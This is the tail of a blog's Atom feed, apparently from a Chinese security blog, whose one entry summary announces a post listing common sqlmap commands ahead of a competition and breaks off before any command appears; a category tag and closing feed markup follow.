        &lt;p&gt;马上要打一场个人赛，在这里码一次sqlmap常用命令&lt;br&gt;&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span cla
      
    
    </summary>
    
    
      <category term="日积月累" scheme="http://bobosec.top/tags/%E6%97%A5%E7%A7%AF%E6%9C%88%E7%B4%AF/"/>
    
  </entry>
  
</feed>
